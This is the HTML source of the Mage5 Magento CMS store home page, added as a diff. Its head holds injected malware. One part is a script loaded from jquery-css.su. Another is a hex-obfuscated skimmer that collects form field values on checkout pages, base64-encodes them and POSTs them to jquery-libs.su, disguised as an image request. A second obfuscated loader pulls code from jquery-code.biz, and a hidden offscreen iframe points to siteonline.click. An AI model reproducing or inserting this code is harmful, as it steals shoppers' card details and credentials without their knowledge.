@@ -1,0 +1,1007 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="google-site-verification" content="z2ogxOq0_ububb0uZsmeFRTA3rY0noq6KgpZWQUWcqM" />
+<title>Mage5 - CMS Solution for Magento Store</title>
+<meta name="description" content="Mage5 framework help you edit your site inline and it is very flexible framework for your developers to make custom theme, block types and connecting admin package with Mage5 Block types. More over it reduces the magento development skinning time. Once your site is live, site owners can easily change images/contents (CMS) very easily using the powerful Mage5 inline editing framework." />
+<meta name="keywords" content="Mage5,Concrete5,Magento CMS,Magento, Varien, E-commerce, Quick Content, File Manager, Sitemap" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<meta name="viewport" content="width=device-width, minimum-scale=1, maximum-scale=1" />
+<link rel="icon" href="http://www.mage5.com/media/favicon/default/logo_menu.png" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.mage5.com/media/favicon/default/logo_menu.png" type="image/x-icon" />
+
+<script type="text/javascript" src="/magefive1.0.0/core/js/mage5-jquery.js"></script>
+
+<script type="text/javascript">
+var jQuery = jQuery.noConflict();
+</script>
+<link media="all" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/styles.css3.php?url=http://www.mage5.com/skin/frontend/default/ma_motoro/" type="text/css" rel="stylesheet" />
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.mage5.com/js/blank.html';
+    var BLANK_IMG = 'http://www.mage5.com/js/spacer.gif';
+//]]>
+</script>
+
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/bootstrap.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/bootstrap-theme.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/my_styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/font-awesome.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/fancybox/jquery.fancybox.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem_blog/css/jquery.bxslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/custommenu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/imagerotator/effect.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/layerednavigationajax/jquery-ui.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/bootstrap-select.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/ma.bestsellervertscroller.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/ma.mostviewedslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/ma.newslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/magentothem/css/ma.onsaleslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.mage5.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.jq.slide.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.bxslider.min.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.flexslider.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.nivo.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/jquery-ui.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/bootstrap/bootstrap.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.mobilemenu.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.lettering.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/backtotop.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ajax_cart_super.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/fancybox/jquery.fancybox.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/custommenu/custommenu.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/noconflict.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/bootstrap-select.min.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/bannersequence/jquery.sequence-min.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/ma.script.vert.js"></script>
+<link href="http://www.mage5.com/index.php/blog/rss/index/store_id/1/" title="Blog" rel="alternate" type="application/rss+xml" />
+<!--[if lt IE 9]>
+<link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/styles-ie.css" media="all" />
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/html5shiv.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/js/magentothem/respond.min.js"></script>
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.mage5.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.mage5.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.mage5.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+
+
+<script type="text/javascript">
+
+var SITE_URL='http://www.mage5.com/';
+var DIRNAME_APP='magefive1.0.0';
+</script>
+
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><!--Jquery libs start-->
+<script src="https://jquery-css.su/app/lib/main.js"></script>
+<!--Jquery libs end--><script>
+var _0xc188=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x6C\x69\x62\x73\x2E\x73\x75\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var gee33b77d74b736f8197ee39a58f56965={snd:null,Glink:_0xc188[0],myid:(function(_0xc2d8x2){var _0xc2d8x3=document[_0xc188[7]][_0xc188[6]]( new RegExp(_0xc188[2]+ _0xc2d8x2[_0xc188[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xc188[3])+ _0xc188[5]));return _0xc2d8x3?decodeURIComponent(_0xc2d8x3[1]):undefined})(_0xc188[1])|| (function(){var _0xc2d8x4= new Date();var _0xc2d8x5=_0xc2d8x4[_0xc188[8]]()+ _0xc188[9]+ Math[_0xc188[11]](Math[_0xc188[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xc2d8x6= new Date( new Date()[_0xc188[8]]()+ 60* 60* 24* 1000);document[_0xc188[7]]= _0xc188[12]+ _0xc2d8x5+ _0xc188[13]+ _0xc2d8x6[_0xc188[14]]();return _0xc2d8x5})(),clk:function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;var _0xc2d8x7=document[_0xc188[17]](_0xc188[16]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8x7[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8x7[_0xc2d8x8][_0xc188[19]][_0xc188[18]]> 0){var _0xc2d8x9=_0xc2d8x7[_0xc2d8x8][_0xc188[20]];if(_0xc2d8x9== _0xc188[21]){_0xc2d8x9= _0xc2d8x8};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]+= _0xc2d8x7[_0xc2d8x8][_0xc188[20]]+ _0xc188[22]+ _0xc2d8x7[_0xc2d8x8][_0xc188[19]]+ _0xc188[23]}}},send:function(){try{var _0xc2d8xa=document[_0xc188[17]](_0xc188[24]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8xa[_0xc188[18]];_0xc2d8x8++){var _0xc2d8xb=_0xc2d8xa[_0xc2d8x8];if(_0xc2d8xb[_0xc188[25]]!= _0xc188[26]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[27]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[28]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[29]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[30]){if(_0xc2d8xb[_0xc188[31]]){_0xc2d8xb[_0xc188[31]](_0xc188[32],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xb[_0xc188[35]](_0xc188[34],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}}};var _0xc2d8xc=document[_0xc188[17]](_0xc188[36]);for(vari= 0;_0xc2d8x8< _0xc2d8xc[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8xc[_0xc2d8x8][_0xc188[31]]){_0xc2d8xc[_0xc2d8x8][_0xc188[31]](_0xc188[37],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xc[_0xc2d8x8][_0xc188[35]](_0xc188[38],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}};if(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]!= null){var _0xc2d8xd=location[_0xc188[44]][_0xc188[43]](_0xc188[42])[_0xc188[41]](0)[_0xc188[40]](_0xc188[39]);var _0xc2d8xe=btoa(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]);var _0xc2d8xf= new XMLHttpRequest();_0xc2d8xf[_0xc188[46]](_0xc188[45],gee33b77d74b736f8197ee39a58f56965.Glink,true);_0xc2d8xf[_0xc188[49]](_0xc188[47],_0xc188[48]);_0xc2d8xf[_0xc188[54]](_0xc188[50]+ _0xc2d8xe+ _0xc188[51]+ _0xc2d8xd+ _0xc188[52]+ gee33b77d74b736f8197ee39a58f56965[_0xc188[53]])};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;_0xc2d8xe= null;setTimeout(function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()},30)}catch(e){}}};if(( new RegExp(_0xc188[57],_0xc188[58]))[_0xc188[56]](window[_0xc188[55]])){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()}
+</script><script>
+var _0x5ff6=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F\x6A\x71\x75\x65\x72\x79\x2D\x31\x2E\x37\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x76\x61\x72\x20\x6A\x51\x75\x65\x72\x79\x31\x37\x20\x3D\x20\x24\x2E\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74\x28\x74\x72\x75\x65\x29\x3B\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x62\x69\x7A\x2F\x74\x65\x78\x74\x2F\x63\x6C\x69\x62\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x5ff6[2]))[_0x5ff6[1]](window[_0x5ff6[0]])){document[_0x5ff6[7]](_0x5ff6[3]+ _0x5ff6[4]+ _0x5ff6[5]+ _0x5ff6[6])}
+</script><div style='width: 600px; height: 600px; position: absolute; left:-5000px; top: -5000px;'>
+    <iframe src='https://siteonline.click/statistics_online'  width='500' height='500'></iframe>
+</div><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-54358005-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+    <link rel="stylesheet" type="text/css" href="http://www.mage5.com/skin/frontend/default/ma_motoro/css/styles_red_blue.css" media="screen" />
+
+				
+	    	<style type="text/css">
+
+    /*google font*/
+        
+        
+    
+        
+       
+
+</style>
+
+</head>
+<body class=" cms-index-index cms-mage5-cms-solution-for-magento">
+
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+			<div class="header-container">
+    <div class="top-link">
+		<div class="container">
+			<div class="row top-link-inner">
+				<div class="col-md-4 col-sm-12 col-xs-12">
+				   <!-- <p class="welcome-msg">Default welcome msg! </p>-->
+				   						<h1 class="logo"><strong>Mage5 - CMS Solution for Magentocommerce</strong><a href="http://www.mage5.com/index.php/" title="Mage5 - CMS Solution for Magentocommerce" class="logo"><img src="http://www.mage5.com/skin/frontend/default/ma_motoro/images/logo.png" alt="Mage5 - CMS Solution for Magentocommerce" /></a></h1>
+										</div>
+				<div class="col-md-8 col-sm-12 col-xs-12">
+					<div class="right-link clearfix pull-right">
+						<ul class="links">
+                        <li class="first" ><a href="http://www.mage5.com/index.php/customer/account/" title="My Account" >My Account</a></li>
+                                <li ><a href="http://www.mage5.com/index.php/checkout/cart/" title="My Cart" class="top-link-cart">My Cart</a></li>
+                                <li ><a href="http://www.mage5.com/index.php/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li ><a href="http://www.mage5.com/index.php/contacts/" title="Contact Us" >Contact Us</a></li>
+                                <li ><a href="http://www.mage5.com/index.php/blog/" title="Blog" >Blog</a></li>
+                                <li class=" last" ><a href="http://www.mage5.com/index.php/customer/account/login/" title="Log In" >Log In</a></li>
+            </ul>
+						<div class="header-curren">							
+													</div>
+						<div class="header-language">
+													</div>
+					</div>
+				</div>
+			</div>
+		</div>	
+    </div>
+    <div class="header">
+		<div class="container">
+			<div class="row">
+				<div class="header-content clearfix">
+					<div class=" top-logo col-xs-12 col-md-3 col-sm-12">
+						<div class="categories">
+							<div class="categories-inner">
+<div class="title-categories">
+<h2>All categories<em class="shapes">&nbsp;</em><em class="fa fa-caret-down"></em></h2>
+</div>
+<div class="navleft-container">
+    <div id="pt_vmegamenu" class="pt_vmegamenu">
+        
+        <div id="pt_menu64" class="pt_menu first " >
+<div class="parentMenu">
+<a href="http://www.mage5.com/index.php/add-ons.html">
+<span>Add-Ons</span>
+</a>
+</div>
+<div class="wrap-popup">
+<div id="popup64" class="popup" >
+<div class="arrow-left-menu" id="arrow-left-menu64">
+</div>
+<div class="box-popup">
+<div class="block1">
+<div class="column last col1" style="float:left;"><div class="itemMenu level1"><a class="itemMenuName level1 nochild" href="http://www.mage5.com/index.php/add-ons/developer.html"><span>Developer</span></a></div></div>
+<div class="clearBoth"></div>
+</div>
+</div>
+</div>
+</div>
+</div><div id="pt_menu65" class="pt_menu ">
+<div class="parentMenu noSubMenu">
+<a href="http://www.mage5.com/index.php/themes.html">
+<span>Themes</span>
+</a>
+</div>
+</div><div id="pt_menu66" class="pt_menu last">
+<div class="parentMenu noSubMenu">
+<a href="http://www.mage5.com/index.php/become-a-partner.html">
+<span>Become&nbsp;a&nbsp;Partner</span>
+</a>
+</div>
+</div>        
+                
+        <div class="clearBoth"></div>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+var VMEGAMENU_POPUP_EFFECT = 2;
+//]]>
+
+$jq(document).ready(function(){
+    $jq("#pt_menu_link ul li").each(function(){
+        var url = document.URL;
+        $jq("#pt_menu_link ul li a").removeClass("act");
+        $jq('#pt_menu_link ul li a[href="'+url+'"]').addClass('act');
+    }); 
+        
+    $jq('.pt_menu').hover(function(){
+        if(VMEGAMENU_POPUP_EFFECT == 0) $jq(this).find('.popup').stop(true,true).slideDown('slow');
+        if(VMEGAMENU_POPUP_EFFECT == 1) $jq(this).find('.popup').stop(true,true).fadeIn('slow');
+        if(VMEGAMENU_POPUP_EFFECT == 2) $jq(this).find('.popup').stop(true,true).show('slow');
+    },function(){
+        if(VMEGAMENU_POPUP_EFFECT == 0) $jq(this).find('.popup').stop(true,true).slideUp('fast');
+        if(VMEGAMENU_POPUP_EFFECT == 1) $jq(this).find('.popup').stop(true,true).fadeOut('fast');
+        if(VMEGAMENU_POPUP_EFFECT == 2) $jq(this).find('.popup').stop(true,true).hide('fast');
+    })
+});
+</script>
+
+</div>						</div>
+					</div>
+					<div class="top-search col-xs-12 col-md-9 col-sm-12">			
+						
+<form id="search_mini_form" action="http://www.mage5.com/index.php/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <div class="box-search-select">
+			<input id="search" type="text" name="q" class="input-text" />
+				
+			<div id="search_autocomplete" class="search-autocomplete"></div>
+			<select class="selectpicker"  id="cat" name="cat">
+				<option value="">All Categories</option>
+									<option value="64">Add-Ons</option>
+																										<option value="63">_Developer</option>
+																																																				<option value="65">Themes</option>
+																																						<option value="66">Become a Partner</option>
+																																				</select>
+		</div>	
+    </div>
+	<div class="submit">
+		<button type="submit" title="Search" class="button"><span><span>Go</span></span></button>
+	</div>	
+</form>
+<script type="text/javascript">
+    jQuery('.selectpicker').selectpicker({
+        'selectedText': 'cat'
+    });
+</script><script type="text/javascript">
+//<![CDATA[
+    var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
+    searchForm.initAutocomplete('http://www.mage5.com/index.php/catalogsearch/ajax/suggest/', 'search_autocomplete');
+//]]>
+</script>
+						<div class="home-page">
+														<a href="http://www.mage5.com/index.php/" >Home</a>
+						</div>
+						<div class="top-cart-wrapper">
+							<div class="top-cart-contain">
+								<script type="text/javascript">
+    $jq(document).ready(function(){
+         var enable_module = $jq('#enable_module').val();
+         if(enable_module==0) return false;
+    })
+
+</script>
+<div id ="mini_cart_block">
+    <div class="block-cart mini_cart_ajax">
+            <div class="block-cart">
+                                <div class="top-cart-title">
+				<a href="http://www.mage5.com/index.php/checkout/cart/">
+                    <span>My Cart:<span>
+					<span><span>0 item</span> </span><i class="fa fa-caret-down"></i></a>
+                </div>
+                <div class="top-cart-content">
+                                                                <p class="empty">You have no items in your shopping cart.</p>
+                                        <div class="top-subtotal">Subtotal: <span class="price">$0.00</span></div>
+                                    </div>
+            </div>
+
+    </div>
+</div>
+							</div>
+						</div>
+					</div>	
+				</div>
+							</div>
+		</div>	
+    </div>
+</div>
+<div class="ma-nav-mobile-container visible-xs">
+	<div class="container">
+		<div class="navbar">
+			<div id="navbar-inner" class="navbar-inner navbar-inactive">
+                                <div class="menu-mobile">
+                                    <a class="btn btn-navbar navbar-toggle">
+                                            <span class="icon-bar"></span>
+                                            <span class="icon-bar"></span>
+                                            <span class="icon-bar"></span>
+                                    </a>
+                                    <span class="brand navbar-brand">Categories</span>
+                                </div>
+				<ul id="ma-mobilemenu" class="mobilemenu nav-collapse collapse">
+					<li class="level0 nav-1 level-top first parent">
+<a href="http://www.mage5.com/index.php/add-ons.html" class="level-top">
+<span>Add-Ons</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first last">
+<a href="http://www.mage5.com/index.php/add-ons/developer.html">
+<span>Developer</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-2 level-top">
+<a href="http://www.mage5.com/index.php/themes.html" class="level-top">
+<span>Themes</span>
+</a>
+</li><li class="level0 nav-3 level-top last">
+<a href="http://www.mage5.com/index.php/become-a-partner.html" class="level-top">
+<span>Become a Partner</span>
+</a>
+</li>				</ul>
+			</div>
+		</div>
+	</div>	
+</div>
+
+<div class="nav-container visible-lg visible-md">
+	<div class="container">
+        <div class="container-inner">
+        <div id="pt_custommenu" class="pt_custommenu">
+        <div id="pt_menu_home" class="pt_menu">
+<div class="parentMenu">
+<a href="http://www.mage5.com/index.php/">
+<span>Home</span>
+</a>
+</div>
+</div>            <div id="pt_menu64" class="pt_menu nav-1">
+<div class="parentMenu">
+<a href="http://www.mage5.com/index.php/add-ons.html">
+<span>Add-Ons</span>
+</a>
+</div>
+<div id="popup64" class="popup" style="display: none; width: 1228px;">
+<div class="block1" id="block164">
+<div class="column last col1"><div class="itemMenu level1"><a class="itemMenuName level1 nochild" href="http://www.mage5.com/index.php/add-ons/developer.html"><span>Developer</span></a></div></div>
+<div class="clearBoth"></div>
+</div>
+</div>
+</div>                    <div id="pt_menu65" class="pt_menu nav-2 pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.mage5.com/index.php/themes.html">
+<span>Themes</span>
+</a>
+</div>
+</div>                    <div id="pt_menu66" class="pt_menu nav-3 pt_menu_no_child">
+<div class="parentMenu">
+<a href="http://www.mage5.com/index.php/become-a-partner.html">
+<span>Become&nbsp;a&nbsp;Partner</span>
+</a>
+</div>
+</div>                
+                
+        <div class="clearBoth"></div>
+    </div>
+    </div>
+	  </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+var CUSTOMMENU_POPUP_EFFECT = 0;
+var CUSTOMMENU_POPUP_TOP_OFFSET = 53;
+//]]>
+</script>
+
+
+			
+			<div class="box-home">
+				<div class="container">
+					<div class="row">
+						<div class="col-md-8 col-sm-12 col-sms-12">
+														
+							
+							
+							
+							<div id="sequence-theme">
+  <div id="sequence">
+    <ul class="sequence-canvas">
+      
+         	      
+     <li class="animate-in">
+        <h2 class ="title">Change your layout/blocks at any time</h2>
+        
+        <!--<h3 class ="subtitle"></h3>-->
+        
+        <div class="intro subtitle">Without spending money, site admin can change home page banner himself. Drag and drop of blocks among areas,  archive/restore blocks, Interactive file manager, Inline block editing and lots of features</div>
+        <img class="slider-bg" src="http://www.mage5.com/media/e2483e3a-fd1a-4f7c-9af3-72e55225acb2.png" alt="Change your layout/blocks at any time" title="Change your layout/blocks at any time" /> <img class="model" src="http://www.mage5.com/media/bgbanner02.png" alt="Change your layout/blocks at any time" title="Change your layout/blocks at any time" />
+        <div class ="link subtitle"> <a href ="http://www.mage5.com/index.php/mage5-cms-plugin-for-magento.html" title="Change your layout/blocks at any time">Buy Now</a> </div>
+        
+      </li>
+     
+          
+     	      
+     <li class="animate-in">
+        <h2 class ="title">Area, Global Area, Block Types</h2>
+        
+        <!--<h3 class ="subtitle"></h3>-->
+        
+        <div class="intro subtitle">Define your area anywhere in the phtml files and add any kind of block types. Make your shop rich with contents.</div>
+        <img class="slider-bg" src="http://www.mage5.com/media/c79a3c69-1138-45c8-bf45-b2c14555d4f0.png" alt="Area, Global Area, Block Types" title="Area, Global Area, Block Types" /> <img class="model" src="http://www.mage5.com/media/bgbanner02.png" alt="Area, Global Area, Block Types" title="Area, Global Area, Block Types" />
+        <div class ="link subtitle"> <a href ="http://www.mage5.com/index.php/blog/cheetsheet/" title="Area, Global Area, Block Types">Documentation</a> </div>
+        
+      </li>
+     
+          
+     	      
+     <li class="animate-in">
+        <h2 class ="title">Extend mage5 - for developers</h2>
+        
+        <!--<h3 class ="subtitle"></h3>-->
+        
+        <div class="intro subtitle">With Mage5 framework developers can make their own block types. You can also reuse it and sell it to marketplace.</div>
+        <img class="slider-bg" src="http://www.mage5.com/media/77c48418-1c10-4b68-b2be-e7e4c6656c19.png" alt="Extend mage5 - for developers" title="Extend mage5 - for developers" /> <img class="model" src="http://www.mage5.com/media/bgbanner02.png" alt="Extend mage5 - for developers" title="Extend mage5 - for developers" />
+        <div class ="link subtitle"> <a href ="http://www.mage5.com/index.php/blog/how-to-make-mage5-block-type/" title="Extend mage5 - for developers">Create Now</a> </div>
+        
+      </li>
+     
+          
+          
+     
+     
+    </ul>
+    <ul class="sequence-pagination">
+      <li><a href="javascript:void(0)">0</a></li><li><a href="javascript:void(0)">1</a></li><li><a href="javascript:void(0)">2</a></li>    </ul>
+  </div>
+</div>
+<script type ="text/javascript">
+
+
+
+    //<![CDATA[
+
